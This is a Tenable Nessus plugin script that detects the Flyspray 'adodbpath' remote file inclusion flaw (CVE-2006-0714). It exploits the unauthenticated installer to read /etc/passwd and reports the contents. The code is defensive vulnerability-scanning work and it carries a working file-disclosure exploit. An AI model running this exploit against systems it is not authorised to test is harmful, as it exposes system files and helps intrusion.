#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20929);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2006-0714");
  script_bugtraq_id(16618);
  script_osvdb_id(23171);

  script_name(english:"Flyspray install-0.9.7.php adodbpath Parameter Remote File Inclusion");
  script_summary(english:"Checks for adodbpath parameter remote file include vulnerability in Flyspray");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Flyspray, an open source, web-based, bug
tracking system written in PHP. 

The installed version of Flyspray contains an installation script that
does not require authentication and that fails to sanitize user input
to the 'adodbpath' parameter before using it in a PHP 'include_once()'
function.  An unauthenticated attacker may be able to exploit this
issue to view arbitrary files on the remote host and to execute
arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/egs_10rc4_php5_incl_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/424902/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Remove the affected script." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/13");
 script_cvs_date("$Date: 2013/01/22 23:15:37 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:flyspray:flyspray");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/flyspray", "/bugs", "/egs", cgi_dirs()));
else dirs = make_list(cgi_dirs());

init_cookiejar();
foreach dir (dirs) {
  foreach subdir (make_list("/sql", "/modules/projects/sql")) {
    url = string(dir, subdir, "/install-0.9.7.php");

    # Check whether the file exists.
    r = http_send_recv3(method: 'GET', item:string(url, "?p=2"), port:port);
    if (isnull(r)) exit(0);

    # If it does ...
    if (">Flyspray setup<" >< r[2]) {
      # Try to exploit the flaw to read /etc/passwd.
      file = "/etc/passwd";

      # First set the session vars.
      #
      # nb: by leaving out some of the required vars, we avoid 
      #     updating the config file yet still create the session.
      postdata = string(
      "basedir=/&", 
      "adodbpath=", file
      );
      r = http_send_recv3(method: 'POST', item: strcat(url, "?p=3"),
      	version: 11, data: postdata, port: port,
add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);

      # If it looks like that worked...
      if ('.php?p=2">Go back and finish it' >< r[2]) {
        # And finally, try to read the file.
        if (get_http_cookie(name: "PHPSESSID")) {
	  r = http_send_recv3(method: 'GET', item:string(url, "?p=4"), port: port);
          if (isnull(r)) exit(0);

          # There's a problem if it looks like the passwd file.
          if (egrep(pattern:"root:.*:0:[01]:", string:r[2])) {
            contents = strstr(r[2], "Setup</h3>");
            if (contents) contents = contents - "Setup</h3>";

            if (isnull(contents)) security_warning(port);
            else {
              report = string(
                "\n",
                "Here are the contents of the file '", file, "' that Nessus\n",
                "was able to read from the remote host :\n",
                "\n",
                contents
              );
              security_warning(port:port, extra:report);
            }

            exit(0);
          }
        }
      }
    }
  }
}
